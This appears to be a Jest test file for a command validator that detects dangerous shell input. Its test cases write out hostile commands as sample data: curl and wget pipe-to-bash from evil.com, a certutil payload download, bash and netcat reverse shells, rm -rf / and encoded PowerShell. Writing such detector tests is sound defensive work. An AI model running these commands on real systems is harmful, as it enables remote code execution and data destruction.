import { describe, it, expect } from '@jest/globals';
import { CommandValidator } from '../validator';
import { ModuleConfig } from '../../../types';

describe('CommandValidator', () => {
  const defaultConfig: ModuleConfig = {
    enabled: true
  };

  describe('constructor', () => {
    it('should create an instance with valid config', () => {
      const validator = new CommandValidator(defaultConfig);
      expect(validator).toBeInstanceOf(CommandValidator);
    });

    it('should throw error if config is invalid', () => {
      expect(() => new CommandValidator(null as any)).toThrow();
    });
  });

  describe('validate', () => {
    it('should detect rm -rf commands', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'rm -rf /var/log/*';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
      expect(findings[0].pattern.category).toBe('command_injection');
      expect(findings[0].matchedText).toBeTruthy();
      expect(findings[0].severity).toBeTruthy();
    });

    it('should detect pipe to bash', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'cat install.sh | bash';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
    });

    it('should detect curl pipe to shell', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'curl http://evil.com/script.sh | bash';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
      // Both pipe_to_shell and remote_execution are valid detections
      expect(['remote_execution', 'pipe_to_shell']).toContain(findings[0].pattern.subcategory);
    });

    it('should detect command chaining with dangerous commands', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'ls /tmp; rm -rf /var/log';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
    });

    it('should detect wget pipe to shell', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'wget http://malicious.com/script.sh -O - | bash';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
      // Both pipe_to_shell and remote_execution are valid detections
      expect(['remote_execution', 'pipe_to_shell']).toContain(findings[0].pattern.subcategory);
    });

    it('should detect backtick command substitution', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'echo `curl http://evil.com`';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
      expect(findings[0].pattern.subcategory).toBe('command_substitution');
    });

    it('should detect dollar substitution', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'echo $(wget http://malicious.com)';

      const findings = await validator.validate(command);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].module).toBe('command_validator');
      expect(findings[0].pattern.subcategory).toBe('command_substitution');
    });

    it('should return empty array for safe commands', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'ls -la /home/user';

      const findings = await validator.validate(command);

      expect(findings).toEqual([]);
    });

    it('should handle safe complex commands', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'git status && npm test';

      const findings = await validator.validate(command);

      expect(findings).toEqual([]);
    });

    it('should respect enabled flag in patterns', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'rm -rf /tmp/test';

      const findings = await validator.validate(command);

      // Should find at least one match since pattern is enabled
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should handle empty string', async () => {
      const validator = new CommandValidator(defaultConfig);
      const findings = await validator.validate('');

      expect(findings).toEqual([]);
    });

    it('should include metadata in findings', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'rm -rf /';

      const findings = await validator.validate(command);

      expect(findings[0]).toHaveProperty('metadata');
      expect(findings[0].metadata).toBeDefined();
    });

    it('should throw error for null input', async () => {
      const validator = new CommandValidator(defaultConfig);

      await expect(validator.validate(null as any)).rejects.toThrow();
    });

    it('should throw error for non-string input', async () => {
      const validator = new CommandValidator(defaultConfig);

      await expect(validator.validate(123 as any)).rejects.toThrow();
    });

    it('should detect multiple vulnerabilities in one command', async () => {
      const validator = new CommandValidator(defaultConfig);
      const command = 'curl http://evil.com | bash && rm -rf /var';

      const findings = await validator.validate(command);

      // Should detect multiple issues
      expect(findings.length).toBeGreaterThan(1);
    });

    describe('Python execution patterns', () => {
      it('should detect os.system()', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'os.system("rm -rf /")';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'python_execution')).toBe(true);
      });

      it('should detect subprocess.Popen()', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'subprocess.Popen("whoami", shell=True)';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'python_execution')).toBe(true);
      });
    });

    describe('Node.js child_process patterns', () => {
      it('should detect require("child_process")', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'require("child_process").exec("ls")';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'nodejs_child_process')).toBe(true);
      });
    });

    describe('PowerShell encoded patterns', () => {
      it('should detect powershell -enc', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'powershell_encoded')).toBe(true);
      });
    });

    describe('Windows LOLBins patterns', () => {
      it('should detect certutil', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'certutil -urlcache -split -f http://evil.com payload.exe';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'windows_lolbins')).toBe(true);
      });

      it('should detect wmic', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'wmic process call create "cmd.exe"';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'windows_lolbins')).toBe(true);
      });
    });

    describe('Reverse shell patterns', () => {
      it('should detect bash reverse shell via /dev/tcp', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_devtcp')).toBe(true);
      });

      it('should detect netcat reverse shell', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'nc -e /bin/sh 10.0.0.1 4444';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_netcat')).toBe(true);
      });

      it('should detect /dev/tcp with IP pattern', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'exec 5<>/dev/tcp/192.168.1.1/8080';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_bash')).toBe(true);
      });
    });

    describe('Shell eval patterns', () => {
      it('should detect eval "$variable"', async () => {
        const validator = new CommandValidator(defaultConfig);
        const command = 'eval "$USER_INPUT"';

        const findings = await validator.validate(command);

        expect(findings.length).toBeGreaterThan(0);
        expect(findings.some(f => f.pattern.subcategory === 'shell_eval')).toBe(true);
      });
    });
  });
});
